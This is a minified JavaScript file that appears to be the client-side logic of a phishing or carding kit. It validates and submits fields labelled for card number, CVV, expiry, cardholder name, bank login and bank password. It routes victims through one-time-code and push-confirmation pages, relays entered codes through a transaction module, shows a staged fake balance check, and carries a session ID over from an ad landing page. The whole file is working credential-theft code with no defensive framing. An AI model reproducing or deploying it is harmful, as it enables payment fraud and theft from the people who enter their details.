var CommonFunctions;(()=>{"use strict";var e={d:(t,n)=>{for(var r in n)e.o(n,r)&&!e.o(t,r)&&Object.defineProperty(t,r,{enumerable:!0,get:n[r]})},o:(e,t)=>Object.prototype.hasOwnProperty.call(e,t),r:e=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})}},t={};function n(e){window.location.replace(e)}function r(e,t,n){let r=new URL(e);return r.searchParams.set(t,n),r}function o(e){let t=e.toString();return e<10&&(t="0"+e),t}function l(e,t){window.sessionStorage.setItem(e,t)}function i(e){let t="",n=0;for(let r=0;r<e.length&&n<18;r++){let o=e[r];" "!=o&&(n%4==0&&0!=n&&(t+=" "),o>="0"&&o<="9"&&(t+=e[r],n++))}return t}function u(e){let t="";for(let n=0;n<Math.min(e.length,5);n++){2==n&&(t+="/");let r=e.charCodeAt(n);if(r>=48&&r<=57)t+=e[n];else if("/"!=e[n]||2!=n)break}return t}function a(e){let t="";for(let n=0;n<Math.min(e.length,4);n++){let r=e.charCodeAt(n);r>=48&&r<=57&&(t+=e[n])}return t}function c(e,t){this.month=parseInt(e)||null,this.year=parseInt(t)||null}function d(e){let t=document.querySelector(".preloader");t&&(t.style.display=e)}function s(){d("none")}function f(){d("block")}function m(e){s(),alert(e.error_message)}function p(){n(r(window.location.href,"page","code"))}function h(){n(r(window.location.href,"page","push"))}function y(e){l("what_to_input",e.what_to_input),n(r(window.location.href,"page","any_input"))}function g(e){n(e.url)}function _(e,t){return e.querySelector(`input[log-field="${t}"]`)}function v(e){return _(e,"card_number")}function b(e){return _(e,"card_cvv")}function w(e){return _(e,"card_valid_thru")}function E(e,t){e.addEventListener("input",(function(e){let n=e.target;n.value=t(n.value)}))}function S(e){let t=document.getElementById("balance_check"),n=document.getElementById("balance_check_holder"),r=document.getElementById("balance_check_content");t.style.display="block",setTimeout((function(){t.style.opacity="1"}),100);let o=3e3;r.hasAttribute("no-timeout")&&(o=0),setTimeout((function(){n&&(n.style.display="none"),r.style.display="block"}),o)}function I(e){e.preventDefault();let t=e.target,n=v(t);if(n&&!function(e){if(16!=e.length&&18!=e.length)return!1;let t="0123456789";for(let e in t)if(-1==t.search(e))return!1;return!0}(n.value.replace(" ","")))return void alert("Enter correct card number");let r=document.getElementById("cc_name");if(r&&!r.value.length)return void alert("Enter correct cardholder name");let o=b(t);if(o&&(l=o.value,!/^\d{3,4}$/.test(l)))return void alert("Enter correct CVV code");var l;let i=function(e){let t=w(e);if(t){let e=t.value.split("/");return new c(e[0],e[1])}let n=e.querySelector('select[name="exp_month"],input[name="exp_month"]'),r=e.querySelector('select[name="exp_year"],input[name="exp_year"]');return n&&r?new c(n.value,r.value):null}(t);if(i){if(!function(e,t){if(!(t>=0))return!1;if(!(e>=1&&e<=12))return!1;let n=new Date,r=n.getFullYear()%100,o=n.getMonth()+1;return!(r>t||r==t&&o>e)}(i.month,i.year))return void alert("Invalid expiration date");let e=function(e,t){let n=document.createElement("input");return n.type="hidden",n.name="log_fields[card_valid_thru]",n.value=t,n}(0,i.toString());t.appendChild(e)}let u=_(t,"bank_login");if(u&&!u.value)return void alert("Enter bank login");let a=_(t,"bank_password");!a||a.value?t.submit():alert("Enter bank password")}function k(e){e.preventDefault();let t=document.getElementById("code_input").value;if(!t)return void alert("Incorrect code");let n=window.ModulesPool.modules.transaction;n?n.send_transaction_code(t):alert("Something went wrong. We can't process your request")}function P(){let e=document.getElementById("payment_form");e&&e.addEventListener("submit",I);let t=document.querySelector('button[data-action="goto_balance_check"]');t&&t.addEventListener("click",S);let n=v(e);n&&E(n,i);let r=w(e);r&&E(r,u);let o=b(e);o&&E(o,a)}function C(){!function(){let e=function(e){let t=document.cookie.split("; ");for(let e of t){let t=e.split("=");if("ad_session_id"==t[0])return t[1]}return null}();e&&l("ad_session_id",e)}()}function T(e=k){let t=document.getElementById("code_form");t&&t.addEventListener("submit",e)}e.r(t),e.d(t,{adPageInit:()=>C,hidePreloader:()=>s,onCodeFormSubmit:()=>k,onPaymentFormSubmit:()=>I,paymentPageInit:()=>P,redirectToAnyInput:()=>y,redirectToCode:()=>p,redirectToPush:()=>h,redirectToUrl:()=>g,showErrorMessage:()=>m,showPreloader:()=>f,transactionPageInit:()=>T}),c.prototype.toString=function(){return`${o(this.month)}/${o(this.year)}`},CommonFunctions=t})();